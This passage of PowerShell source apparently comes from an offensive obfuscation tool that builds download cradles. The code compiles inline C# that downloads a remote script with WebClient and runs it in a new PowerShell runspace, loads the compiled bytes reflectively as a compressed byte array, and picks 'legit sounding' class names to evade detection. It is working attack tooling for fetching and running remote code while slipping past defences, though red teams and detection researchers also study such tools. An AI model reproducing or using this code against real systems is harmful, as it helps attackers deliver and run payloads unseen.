                                    $SystemManagementAutomationDllPath = [PsObject].Assembly.Location

                                    # Iterate through each csc.exe path until compilation is successful.
                                    ForEach($PathToCsc in $PathToCscArray)
                                    {
                                        If(!(Test-Path $TempFileDll))
                                        {
                                            Write-Host "[*] Re-compiling updated CSharp with " -NoNewLine
                                            Write-Host $PathToCsc -NoNewLine -ForegroundColor Yellow

                                            # Compile CSharp script in .cs to .dll.
                                            $NULL = . $PathToCsc /target:library /reference:$SystemManagementAutomationDllPath /out:$TempFileDll $TempFileCs
            
                                            If(Test-Path $TempFileDll)
                                            {
                                                Write-Host " - " -NoNewLine
                                                Write-Host "SUCCESS" -ForegroundColor Green

                                                Write-Host "[*] Successful Command: " -NoNewLine
                                                Write-Host ". $PathToCsc /target:library /reference:$SystemManagementAutomationDllPath /out:$TempFileDll $TempFileCs" -ForegroundColor Yellow
                                            }
                                            Else
                                            {
                                                Write-Host " - " -NoNewLine
                                                Write-Host "FAILED" -ForegroundColor Red
                                            }
                                        }
                                    }
        
                                    If(Test-Path $TempFileDll)
                                    {
                                        # Read in bytes from compiled CSharp.
                                        $Bytes = [System.IO.File]::ReadAllBytes($TempFileDll)
                                    }
                                    Else
                                    {
                                        Write-Host "WARNING: " -NoNewLine -ForegroundColor Yellow
                                        Write-Host "CSharp code was not properly compiled and the resultant .dll file was not found at " -NoNewLine
                                        Write-Host $TempFileDll -NoNewLine -ForegroundColor Yellow
                                        Write-Host ")..."
            
                                        Write-Host "         Enter " -NoNewline
                                        Write-Host "RESET" -NoNewLine -ForegroundColor Yellow
                                        Write-Host " to start over and try again..."
                                    }

                                    # Remove .cs and .dll CSharp artifacts that were just created.
                                    ForEach($TempFile in @($TempFileCs,$TempFileDll))
                                    {
                                        If(Test-Path $TempFile)
                                        {
                                            Remove-Item $TempFile
                                        }
                                    }
        
                                    # Convert byte array to a byte array string format.
                                    $BytesAsString = "@(" + ($Bytes -Join ',') + ")"

                                    $OriginalLength = $BytesAsString.Length

                                    $Counter = 0
                                    For($NumberOfZeroes=600; $NumberOfZeroes -ge 6; $NumberOfZeroes = $NumberOfZeroes-2)
                                    {
	                                    # To significantly reduce space to fit on command line, we will "compress" adjacent 0's by converting it to an array multiplication syntax: @(0)*20, for example.
	                                    If($BytesAsString -Match "([(,]0){$NumberOfZeroes,}[^0]")
	                                    {
		                                    $Counter++

                                            # Get number of adjacent 0's in array.
                                            $ZeroCount = $Matches[0].Split(',').Count

                                            $Whitespace = ' '*(3-$ZeroCount.ToString().Length)
		                                    Write-Host "[*] Compressing $Whitespace" -NoNewLine
                                            Write-Host $ZeroCount -NoNewLine -ForegroundColor Yellow
                                            Write-Host " adjacent 0's in Byte Array..."

		                                    $RestOfArray = "+@(" + $Matches[0].Split(',')[-1]
		                                    If($Matches[0].EndsWith(')'))
		                                    {
			                                    $RestOfArray = ''
		                                    }

		                                    $BytesAsString = $BytesAsString.Replace($Matches[0],")+@(0)*$($Matches[0].Trim(',').Split(',').Count)" + $RestOfArray)
	                                    }
                                    }
                                    If($BytesAsString.StartsWith('@)+'))
                                    {
                                        $BytesAsString = $BytesAsString.SubString(3)
                                    }

                                    $UpdatedLength = $BytesAsString.Length

                                    If($OriginalLength -gt $UpdatedLength)
                                    {
                                        Write-Host "[*] Compressed Byte Array from " -NoNewLine
                                        Write-Host $OriginalLength -NoNewLine -ForegroundColor Yellow
                                        Write-Host " characters to " -NoNewLine
                                        Write-Host $UpdatedLength -NoNewLine -ForegroundColor Yellow
                                        Write-Host " characters..." -NoNewLine

                                        # Put a brief sleep so user can see the compilation and compression output more easily.
                                        Start-Sleep -Seconds 1
                                    }

                                    # Set updated $InlineCSharp and $BytesAsString into Script-level variables so we can just retrieve them next iteration if no re-compiling is necessary.
                                    $Script:LastInlineCSharp  = $InlineCSharp
                                    $Script:LastBytesAsString = $BytesAsString
                                }
                            
                                Write-Host ""
                            }

                            # Add syntax to convert Byte Array string syntax to an actual byte array for Load method.
                            $BytesAsString = "[Byte[]]($BytesAsString)"
                        }

                        # Set command arrangement logic here.
                        $CommandArray  = @()

                        $CommandArray += ("$ReflectionAssembly::" + $Load.Replace($ReflectionAssemblyTag,$ReflectionAssembly.Replace('[Void]','').Replace('$Null=','')) + "($BytesAsString)")
                        $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                        
                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            # Only add $Command if $InlineScriptTag was present in $Invoke (and currently removed and only left with <<<00>>> tags).
                            If($Command -AND !$Invoke.Contains('<<<00>>>'))
                            {
                                $CommandArray += $Command
                            }
                        }
                        
                        # Set command ordering arrangement logic here.
                        $Syntax = ($CommandArray -Join ';').Trim(';').Replace(';;',';').Replace(';;',';').Replace(';0>>>;',';0>>>')

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                2 {
                    # Syntax concatenate into logical variable count and names with default variable GET/SET syntax.
                    
                    # Set more logical variable names for this block.
                    $RandomVarName1 = 'compiledScript' # Compiled Script
                    $RandomVarName2 = 'url'            # Url
                    $RandomVarName3 = 'command'        # Command (Post Cradle Command)

                    $VarOptionsIndex  = 0
                    $NumberOfVarNames = 3

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex

                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }
                    
                    # Throw warning message if Automation or AutomationRunspaces classes are chosen but Invoke option is not 11 (thus these classes are not present in the command).
                    If(!$Invoke.Contains($InlineScriptTag) -AND (@('Automation','AutomationRunspaces') -Contains $LastVariableName))
                    {
                        Write-Host "`n"
                        Write-Host "WARNING: " -NoNewline -ForegroundColor Yellow
                        Write-Host "Cannot obfuscate the '" -NoNewLine
                        Write-Host $LastVariableName -NoNewline -ForegroundColor Yellow
                        Write-Host "' class since it is not present."
                        Write-Host "         Select Invoke\11 to introduce this class into ObfuscatedCommand."
                    }

                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','SystemNet','Automation','AutomationRunspaces','ClassAndMethod','ReflectionAssembly','Load')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}
                        }
               
                        # Extract Class and Method names from $ClassAndMethod array.         
                        $ClassName  = $ClassAndMethod[0]
                        $MethodName = $ClassAndMethod[1]

                        # Array gets converted to a string when tags are applied earlier in the script, so we will split it back out and handle tags if they exist.
                        If($ClassAndMethod.GetType().Name -eq 'String')
                        {
                            $ClassName  = $ClassAndMethod.Split(' ')[0]
                            $MethodName = $ClassAndMethod.Split(' ')[1]
                            
                            # Handle tags if they exist.
                            If($ClassName.StartsWith('<<<0'))
                            {
                                $ClassName = $ClassName + '0>>>'
                            }
                            If($MethodName.EndsWith('0>>>'))
                            {
                                $MethodName = '<<<0' + $MethodName
                            }
                        }
                                                
                        # Extra steps to set and highlight two-part values -- Using and non-using for each class, and method/class name pair.
                        $UsingSystemNet = $SystemNet.ToString().Trim().Replace('<<<0 0>>>','<<<00>>>')
                        $SystemNet      = 'System.Net.'
                        If(($UsingSystemNet -ne '') -AND ($UsingSystemNet -ne '<<<00>>>'))
                        {
                            $SystemNet = ''
                        }
                        $UsingAutomation = $Automation.ToString().Trim().Replace('<<<0 0>>>','<<<00>>>')
                        $Automation      = 'System.Management.Automation.'
                        If(($UsingAutomation -ne '') -AND ($UsingAutomation -ne '<<<00>>>'))
                        {
                            $Automation = ''
                        }
                        $UsingAutomationRunspaces = $AutomationRunspaces.ToString().Trim().Replace('<<<0 0>>>','<<<00>>>')
                        $AutomationRunspaces = 'System.Management.Automation.Runspaces.'
                        If(($UsingAutomationRunspaces -ne '') -AND ($UsingAutomationRunspaces -ne '<<<00>>>'))
                        {
                            $AutomationRunspaces = ''
                        }

                        # Add tags for each class and method/class name if necessary.
                        If($UsingSystemNet.StartsWith('<<<0') -AND ($UsingSystemNet -ne ''))
                        {
                            $SystemNet = '<<<0' + $SystemNet + '0>>>'
                        }
                        If($UsingAutomation.StartsWith('<<<0') -AND ($UsingAutomation -ne ''))
                        {
                            $Automation = '<<<0' + $Automation + '0>>>'
                        }
                        If($UsingAutomationRunspaces.StartsWith('<<<0') -AND ($UsingAutomationRunspaces -ne ''))
                        {
                            $AutomationRunspaces = '<<<0' + $AutomationRunspaces + '0>>>'
                        }

                        # Set Inline CSharp syntaxes: first for default and second for if invoke option 11 (routed to 13) is selected.
                        $InlineCSharp             = "$UsingSystemNet`public class $ClassName{public static string $MethodName(string url){return (new $SystemNet`WebClient()).DownloadString(url);}}"
                        $InlineCSharpWithRunspace = "$UsingSystemNet$UsingAutomation$UsingAutomationRunspaces`public class $ClassName{public static void $MethodName(string url$InlineCommandParamTag){$AutomationRunspaces`Runspace rs=$AutomationRunspaces`RunspaceFactory.CreateRunspace();rs.Open();$Automation`PowerShell ps=$Automation`PowerShell.Create();ps.Runspace=rs;ps.AddScript((new $SystemNet`WebClient()).DownloadString(url)$InlineCommandTag);ps.Invoke();}}"

                        # Use this variable to denote if inline script invocation is occurring when Command is specified.
                        $CommandSetAsVariable = $NULL

                        # $InlineScriptTag is only present if option 11 was selected from the Invoke menu.
                        # If Command is defined then we should add an additional parameter and script syntax in $InlineCSharp.
                        If($Invoke.Contains($InlineScriptTag))
                        {
                            # Remove $InlineScriptTag from Invoke since we have this value in Invoke only to communicate that the Invoke option 11 (routed to 13) was selected.
                            $Invoke = $Invoke.Replace($InlineScriptTag,'')

                            # Set $Invoke to $InlineCSharpWithRunspace since the result will be invoked within the inline script.
                            $InlineCSharp = $InlineCSharpWithRunspace
                            
                            # We will add this parameter if $Command is defined.
                            $PostCradleCommandParam = ',string postcradlecommand'

                            # Add additional parameter for inline script and method invocation if $Command (PostCradleCommand) has been specified by the user. 
                            If($Command)
                            {
                                $InlineCSharp = $InlineCSharp.Replace($InlineCommandParamTag,$PostCradleCommandParam)
                                $InlineCSharp = $InlineCSharp.Replace($InlineCommandTag,'+";"+postcradlecommand')
                                $SyntaxToInvoke = "([$ClassName]::$MethodName($GetVar2,$GetVar3))"
                                $CommandSetAsVariable = "$SetVar3{$Command}"
                                $Command = $NULL
                            }
                            Else
                            {
                                # Remove tags if no $Command (PostCradleCommand) has been specified by the user.
                                $InlineCSharp = $InlineCSharp.Replace($InlineCommandParamTag,'')
                                $InlineCSharp = $InlineCSharp.Replace($InlineCommandTag,'')
                                $SyntaxToInvoke = "([$ClassName]::$MethodName($GetVar2))"
                            }
                            
                            # Add tags to $SyntaxToInvoke if Rearrange or AllOptions were selected since $SyntaxToInvoke now is our invocation syntax since payload is being invoked inside of the PS Runspace.
                            If(($i -eq 2) -AND ($AllOptionsSelected -OR ($LastVariableName -eq 'Invoke')))
                            {
                                $SyntaxToInvoke = '<<<0' + $SyntaxToInvoke + '0>>>'
                            }
                        }
                        Else
                        {
                            # Remove $InlineScriptTag from $Invoke since we have this value in Invoke only to communicate that the Invoke option 11 (routed to 13) was selected.
                            $Invoke = $Invoke.Replace($InlineScriptTag,'')

                            # Remove $InlineScriptTag from $InlineCSharp.
                            $InlineCSharp = $InlineCSharp.Replace($InlineScriptTag,'')

                            $SyntaxToInvoke = "([$ClassName]::$MethodName($GetVar2))"
                        }

                        # Only deal with compilation on the first iteration since it will be the same for the second iteration.
                        If($i -eq 1)
                        {
                            # We will get $BytesAsString either from compiling CSharp code or retrieving from last iteration if the CSharp code has not changed (and does not need re-compiling).
                            $BytesAsString = ''

                            # Check if Class and Method names need to be updated. This is needed if All\1 is selected first.
                            $ClassAndMethodNeedUpdating = $TRUE
                            ForEach($PrecompiledOption in ($LegitSoundingClassAndMethodCompiledDefault + $LegitSoundingClassAndMethodCompiledNormal + $LegitSoundingClassAndMethodCompiledRandom))
                            {
                                $ClassAndMethodSyntax = "[$($PrecompiledOption[0])]::$($PrecompiledOption[1])("

                                If($SyntaxToInvoke.Replace('<<<0','').Replace('0>>>','').Contains($ClassAndMethodSyntax))
                                {
                                    $ClassAndMethodNeedUpdating = $FALSE
                                }
                            }

                            # Only re-compile $InlineCSharp if it has changed from the last compiled version.
                            If(!$ClassAndMethodNeedUpdating -AND ($Script:LastInlineCSharp.Length -gt 0) -AND ($Script:LastInlineCSharp -eq $InlineCSharp.Replace('<<<0','').Replace('0>>>','')))
                            {
                                $BytesAsString = $Script:LastBytesAsString
                            }
                            Else
                            {
                                # Check if csc.exe is present. If not (like if running PowerShell on a non-Windows OS) then select from handful of pre-compiled versions and output warning to user.
                                $PathToCscArray = Get-ChildItem $env:windir\Microsoft.NET\Framework*\v*\csc.exe | ForEach-Object {$_.FullName}

                                Write-Host "`n"

                                If($PathToCscArray.Count -eq 0)
                                {
                                    Write-Host "WARNING: " -NoNewLine -ForegroundColor Yellow
                                    Write-Host "Could not find " -NoNewLine
                                    Write-Host "csc.exe" -NoNewLine -ForegroundColor Yellow
                                    Write-Host " on this computer. Switching to small list of pre-compiled samples. (I.e. not very random)"

                                    # Use the input $ClassName to find pre-compiled CSharp sample with corresponding class name.
                                    If($ClassName -eq 'Class')
                                    {
                                        $PrecompiledCSharp = Get-Random -Input $LegitSoundingClassAndMethodCompiledDefault
                                    }
                                    ElseIf(($LegitSoundingClassAndMethodCompiledNormal | ForEach-Object {$_[0]}) -Contains $ClassName)
                                    {
                                        $PrecompiledCSharp = $LegitSoundingClassAndMethodCompiledNormal | Where-Object {$_[0] -eq $ClassName}
                                    }
                                    Else
                                    {
                                        $PrecompiledCSharp = Get-Random -Input $LegitSoundingClassAndMethodCompiledRandom
                                    }

                                    # Also update $SyntaxToInvoke and $InlineCSharp to reflect this updated ClassName and MethodName.
                                    $SyntaxToInvoke = $SyntaxToInvoke.Replace($ClassName,$PrecompiledCSharp[0]).Replace($MethodName,$PrecompiledCSharp[1])
                                    $InlineCSharp   = $InlineCSharp.Replace("public class $ClassName{","public class $($PrecompiledCSharp[0]){").Replace(" $MethodName(string "," $($PrecompiledCSharp[1])(string ")

                                    # Update current $ClassName, $MethodName, and $BytesAsString for remainder of this iteration.
                                    $ClassName  = $PrecompiledCSharp[0]
                                    $MethodName = $PrecompiledCSharp[1]

                                    # Handle extraction of correct pre-compiled CSharp (out of three possible options per each pre-compiled version).
                                    If($PostCradleCommandParam.Length -eq 0)
                                    {
                                        # Extract pre-compiled version that takes one argument as input and Invoke 11 is not selected.
                                        $BytesAsString = $PrecompiledCSharp[2][0]
                                    }
                                    ElseIf(!$SyntaxToInvoke.Contains(','))
                                    {
                                        # Extract pre-compiled version that takes two arguments as input and Invoke 11 was selected but no $PostCradleCommand.
                                        $BytesAsString = $PrecompiledCSharp[2][1]
                                    }
                                    Else
                                    {
                                        # Extract pre-compiled version that takes two arguments as input and Invoke 11 was selected and $PostCradleCommand is set.
                                        $BytesAsString = $PrecompiledCSharp[2][2]
                                    }

                                    # Extract ClassName, MethodName, and BytesAsString from above assigned pre-compiled CSharp and update 'WithTags' for next iteration.
                                    If($ClassAndMethodWithTags.GetType().Name -eq 'Object[]')
                                    {
                                        $ClassAndMethodWithTags = @($ClassName,$MethodName)
                                    }
                                    Else
                                    {
                                        $ClassAndMethodWithTags = '<<<0' + $ClassName + ' ' + $MethodName + '0>>>'
                                    }

                                    # Set updated $InlineCSharp and $BytesAsString into Script-level variables so we can just retrieve them next iteration if no re-compiling is necessary.
                                    $Script:LastInlineCSharp  = $InlineCSharp
                                    $Script:LastBytesAsString = $BytesAsString
                                }
                                Else
                                {
                                    # Temporary .cs and .dll files for CSharp compilation.
                                    $TempFileCs  = "$ScriptDir\cradle.cs"
                                    $TempFileDll = "$ScriptDir\cradle.dll"

                                    # Remove previous .cs and .dll CSharp artifacts if they exist from previous run.
                                    ForEach($TempFile in @($TempFileCs,$TempFileDll))
                                    {
                                        If(Test-Path $TempFile)
                                        {
                                            Remove-Item $TempFile
                                        }
                                    }

                                    # Write out $InlineCSharp to disk so we can compile to .dll with csc.exe and then read in the compiled bytes.
                                    Write-Output $InlineCSharp > $TempFileCs

                                    # Retrieve path to System.Management.Automation.dll for csc.exe command to be able to identify referenced assembly.
                                    $SystemManagementAutomationDllPath = [PsObject].Assembly.Location

                                    # Iterate through each csc.exe path until compilation is successful.
                                    ForEach($PathToCsc in $PathToCscArray)
                                    {
                                        If(!(Test-Path $TempFileDll))
                                        {
                                            Write-Host "[*] Re-compiling updated CSharp with " -NoNewLine
                                            Write-Host $PathToCsc -NoNewLine -ForegroundColor Yellow

                                            # Compile CSharp script in .cs to .dll.
                                            $NULL = . $PathToCsc /target:library /reference:$SystemManagementAutomationDllPath /out:$TempFileDll $TempFileCs
            
                                            If(Test-Path $TempFileDll)
                                            {
                                                Write-Host " - " -NoNewLine
                                                Write-Host "SUCCESS" -ForegroundColor Green

                                                Write-Host "[*] Successful Command: " -NoNewLine
                                                Write-Host ". $PathToCsc /target:library /reference:$SystemManagementAutomationDllPath /out:$TempFileDll $TempFileCs" -ForegroundColor Yellow
                                            }
                                            Else
                                            {
                                                Write-Host " - " -NoNewLine
                                                Write-Host "FAILED" -ForegroundColor Red
                                            }
                                        }
                                    }
        
                                    If(Test-Path $TempFileDll)
                                    {
                                        # Read in bytes from compiled CSharp.
                                        $Bytes = [System.IO.File]::ReadAllBytes($TempFileDll)
                                    }
                                    Else
                                    {
                                        Write-Host "WARNING: " -NoNewLine -ForegroundColor Yellow
                                        Write-Host "CSharp code was not properly compiled and the resultant .dll file was not found at " -NoNewLine
                                        Write-Host $TempFileDll -NoNewLine -ForegroundColor Yellow
                                        Write-Host ")..."
            
                                        Write-Host "         Enter " -NoNewline
                                        Write-Host "RESET" -NoNewLine -ForegroundColor Yellow
                                        Write-Host " to start over and try again..."
                                    }

                                    # Remove .cs and .dll CSharp artifacts that were just created.
                                    ForEach($TempFile in @($TempFileCs,$TempFileDll))
                                    {
                                        If(Test-Path $TempFile)
                                        {
                                            Remove-Item $TempFile
                                        }
                                    }
        
                                    # Convert byte array to a byte array string format.
                                    $BytesAsString = "@(" + ($Bytes -Join ',') + ")"

                                    $OriginalLength = $BytesAsString.Length

                                    $Counter = 0
                                    For($NumberOfZeroes=600; $NumberOfZeroes -ge 6; $NumberOfZeroes = $NumberOfZeroes-2)
                                    {
	                                    # To significantly reduce space to fit on command line, we will "compress" adjacent 0's by converting it to an array multiplication syntax: @(0)*20, for example.
	                                    If($BytesAsString -Match "([(,]0){$NumberOfZeroes,}[^0]")
	                                    {
		                                    $Counter++

                                            # Get number of adjacent 0's in array.
                                            $ZeroCount = $Matches[0].Split(',').Count

                                            $Whitespace = ' '*(3-$ZeroCount.ToString().Length)
		                                    Write-Host "[*] Compressing $Whitespace" -NoNewLine
                                            Write-Host $ZeroCount -NoNewLine -ForegroundColor Yellow
                                            Write-Host " adjacent 0's in Byte Array..."

		                                    $RestOfArray = "+@(" + $Matches[0].Split(',')[-1]
		                                    If($Matches[0].EndsWith(')'))
		                                    {
			                                    $RestOfArray = ''
		                                    }

		                                    $BytesAsString = $BytesAsString.Replace($Matches[0],")+@(0)*$($Matches[0].Trim(',').Split(',').Count)" + $RestOfArray)
	                                    }
                                    }
                                    If($BytesAsString.StartsWith('@)+'))
                                    {
                                        $BytesAsString = $BytesAsString.SubString(3)
                                    }

                                    $UpdatedLength = $BytesAsString.Length

                                    If($OriginalLength -gt $UpdatedLength)
                                    {
                                        Write-Host "[*] Compressed Byte Array from " -NoNewLine
                                        Write-Host $OriginalLength -NoNewLine -ForegroundColor Yellow
                                        Write-Host " characters to " -NoNewLine
                                        Write-Host $UpdatedLength -NoNewLine -ForegroundColor Yellow
                                        Write-Host " characters..." -NoNewLine

                                        # Put a brief sleep so user can see the compilation and compression output more easily.
                                        Start-Sleep -Seconds 1
                                    }

                                    # Set updated $InlineCSharp and $BytesAsString into Script-level variables so we can just retrieve them next iteration if no re-compiling is necessary.
                                    $Script:LastInlineCSharp  = $InlineCSharp
                                    $Script:LastBytesAsString = $BytesAsString
                                }
                            
                                Write-Host ""
                            }

                            # Add syntax to convert Byte Array string syntax to an actual byte array for Load method.
                            $BytesAsString = "[Byte[]]($BytesAsString)"
                        }

                        # Set command arrangement logic here.
                        $CommandArray  = @()

                        $CommandArray += "$SetVar1$BytesAsString"
                        $CommandArray += "$SetVar2'$Url'"

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($CommandSetAsVariable)
                            {
                                $CommandArray += $CommandSetAsVariable
                            }
                            Else
                            {
                                $CommandArray += ''
                            }
                        }
                        Else
                        {
                            $CommandArray += ''
                        }

                        $CommandArray += ("$ReflectionAssembly::" + $Load.Replace($ReflectionAssemblyTag,$ReflectionAssembly.Replace('[Void]','').Replace('$Null=','')) + "($GetVar1)")
                        $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                        
                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command)
                            {
                                $CommandArray += $Command
                            }
                        }
                        
                        # Set command ordering arrangement logic here.
                        $Syntax = (($CommandArray[$ArrayIndexOrder_012] + $CommandArray[3,4,5]) -Join ';').Trim(';').Replace(';;',';').Replace(';;',';').Replace(';0>>>;',';0>>>')

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                3 {
                    # Syntax concatenate into logical variable count but random names with obfuscated variable GET/SET syntax.

                    $VarOptionsIndex  = 1
                    $NumberOfVarNames = 3

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex

                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }
                    
                    # Throw warning message if Automation or AutomationRunspaces classes are chosen but Invoke option is not 11 (thus these classes are not present in the command).
                    If(!$Invoke.Contains($InlineScriptTag) -AND (@('Automation','AutomationRunspaces') -Contains $LastVariableName))
                    {
                        Write-Host "`n"
                        Write-Host "WARNING: " -NoNewline -ForegroundColor Yellow
                        Write-Host "Cannot obfuscate the '" -NoNewLine
                        Write-Host $LastVariableName -NoNewline -ForegroundColor Yellow
                        Write-Host "' class since it is not present."
                        Write-Host "         Select Invoke\11 to introduce this class into ObfuscatedCommand."
                    }

                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','SystemNet','Automation','AutomationRunspaces','ClassAndMethod','ReflectionAssembly','Load')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}
                        }
               
                        # Extract Class and Method names from $ClassAndMethod array.         
                        $ClassName  = $ClassAndMethod[0]
                        $MethodName = $ClassAndMethod[1]

                        # Array gets converted to a string when tags are applied earlier in the script, so we will split it back out and handle tags if they exist.
                        If($ClassAndMethod.GetType().Name -eq 'String')
                        {
                            $ClassName  = $ClassAndMethod.Split(' ')[0]
                            $MethodName = $ClassAndMethod.Split(' ')[1]
                            
                            # Handle tags if they exist.
                            If($ClassName.StartsWith('<<<0'))
                            {
                                $ClassName = $ClassName + '0>>>'
                            }
                            If($MethodName.EndsWith('0>>>'))
                            {
                                $MethodName = '<<<0' + $MethodName
                            }
                        }
                                                
                        # Extra steps to set and highlight two-part values -- Using and non-using for each class, and method/class name pair.
                        $UsingSystemNet = $SystemNet.ToString().Trim().Replace('<<<0 0>>>','<<<00>>>')
                        $SystemNet      = 'System.Net.'
                        If(($UsingSystemNet -ne '') -AND ($UsingSystemNet -ne '<<<00>>>'))
                        {
                            $SystemNet = ''
                        }
                        $UsingAutomation = $Automation.ToString().Trim().Replace('<<<0 0>>>','<<<00>>>')
                        $Automation      = 'System.Management.Automation.'
                        If(($UsingAutomation -ne '') -AND ($UsingAutomation -ne '<<<00>>>'))
                        {
                            $Automation = ''
                        }
                        $UsingAutomationRunspaces = $AutomationRunspaces.ToString().Trim().Replace('<<<0 0>>>','<<<00>>>')
                        $AutomationRunspaces = 'System.Management.Automation.Runspaces.'
                        If(($UsingAutomationRunspaces -ne '') -AND ($UsingAutomationRunspaces -ne '<<<00>>>'))
                        {
                            $AutomationRunspaces = ''
                        }

                        # Add tags for each class and method/class name if necessary.
                        If($UsingSystemNet.StartsWith('<<<0') -AND ($UsingSystemNet -ne ''))
                        {
                            $SystemNet = '<<<0' + $SystemNet + '0>>>'
                        }
                        If($UsingAutomation.StartsWith('<<<0') -AND ($UsingAutomation -ne ''))
                        {
                            $Automation = '<<<0' + $Automation + '0>>>'
                        }
                        If($UsingAutomationRunspaces.StartsWith('<<<0') -AND ($UsingAutomationRunspaces -ne ''))
                        {
                            $AutomationRunspaces = '<<<0' + $AutomationRunspaces + '0>>>'
                        }

                        # Set Inline CSharp syntaxes: first for default and second for if invoke option 11 (routed to 13) is selected.
                        $InlineCSharp             = "$UsingSystemNet`public class $ClassName{public static string $MethodName(string url){return (new $SystemNet`WebClient()).DownloadString(url);}}"
                        $InlineCSharpWithRunspace = "$UsingSystemNet$UsingAutomation$UsingAutomationRunspaces`public class $ClassName{public static void $MethodName(string url$InlineCommandParamTag){$AutomationRunspaces`Runspace rs=$AutomationRunspaces`RunspaceFactory.CreateRunspace();rs.Open();$Automation`PowerShell ps=$Automation`PowerShell.Create();ps.Runspace=rs;ps.AddScript((new $SystemNet`WebClient()).DownloadString(url)$InlineCommandTag);ps.Invoke();}}"

                        # Use this variable to denote if inline script invocation is occurring when Command is specified.
                        $CommandSetAsVariable = $NULL

                        # $InlineScriptTag is only present if option 11 was selected from the Invoke menu.
                        # If Command is defined then we should add an additional parameter and script syntax in $InlineCSharp.
                        If($Invoke.Contains($InlineScriptTag))
                        {
                            # Remove $InlineScriptTag from Invoke since we have this value in Invoke only to communicate that the Invoke option 11 (routed to 13) was selected.
                            $Invoke = $Invoke.Replace($InlineScriptTag,'')

                            # Set $Invoke to $InlineCSharpWithRunspace since the result will be invoked within the inline script.
                            $InlineCSharp = $InlineCSharpWithRunspace
                            
                            # We will add this parameter if $Command is defined.
                            $PostCradleCommandParam = ',string postcradlecommand'

                            # Add additional parameter for inline script and method invocation if $Command (PostCradleCommand) has been specified by the user. 
                            If($Command)
                            {
                                $InlineCSharp = $InlineCSharp.Replace($InlineCommandParamTag,$PostCradleCommandParam)
                                $InlineCSharp = $InlineCSharp.Replace($InlineCommandTag,'+";"+postcradlecommand')
                                $SyntaxToInvoke = "([$ClassName]::$MethodName($GetVar2,$GetVar3))"
                                $CommandSetAsVariable = "$SetVar3{$Command}"
                                $Command = $NULL
                            }
                            Else
                            {
                                # Remove tags if no $Command (PostCradleCommand) has been specified by the user.
                                $InlineCSharp = $InlineCSharp.Replace($InlineCommandParamTag,'')
                                $InlineCSharp = $InlineCSharp.Replace($InlineCommandTag,'')
                                $SyntaxToInvoke = "([$ClassName]::$MethodName($GetVar2))"
                            }
                            
                            # Add tags to $SyntaxToInvoke if Rearrange or AllOptions were selected since $SyntaxToInvoke now is our invocation syntax since payload is being invoked inside of the PS Runspace.
                            If(($i -eq 2) -AND ($AllOptionsSelected -OR ($LastVariableName -eq 'Invoke')))
                            {
                                $SyntaxToInvoke = '<<<0' + $SyntaxToInvoke + '0>>>'
                            }
                        }
                        Else
                        {
                            # Remove $InlineScriptTag from $Invoke since we have this value in Invoke only to communicate that the Invoke option 11 (routed to 13) was selected.
                            $Invoke = $Invoke.Replace($InlineScriptTag,'')

                            # Remove $InlineScriptTag from $InlineCSharp.
                            $InlineCSharp = $InlineCSharp.Replace($InlineScriptTag,'')

                            $SyntaxToInvoke = "([$ClassName]::$MethodName($GetVar2))"
                        }

                        # Only deal with compilation on the first iteration since it will be the same for the second iteration.
                        If($i -eq 1)
                        {
                            # We will get $BytesAsString either from compiling CSharp code or retrieving from last iteration if the CSharp code has not changed (and does not need re-compiling).
                            $BytesAsString = ''

                            # Check if Class and Method names need to be updated. This is needed if All\1 is selected first.
                            $ClassAndMethodNeedUpdating = $TRUE
                            ForEach($PrecompiledOption in ($LegitSoundingClassAndMethodCompiledDefault + $LegitSoundingClassAndMethodCompiledNormal + $LegitSoundingClassAndMethodCompiledRandom))
                            {
                                $ClassAndMethodSyntax = "[$($PrecompiledOption[0])]::$($PrecompiledOption[1])("

                                If($SyntaxToInvoke.Replace('<<<0','').Replace('0>>>','').Contains($ClassAndMethodSyntax))
                                {
                                    $ClassAndMethodNeedUpdating = $FALSE
                                }
                            }

                            # Only re-compile $InlineCSharp if it has changed from the last compiled version.
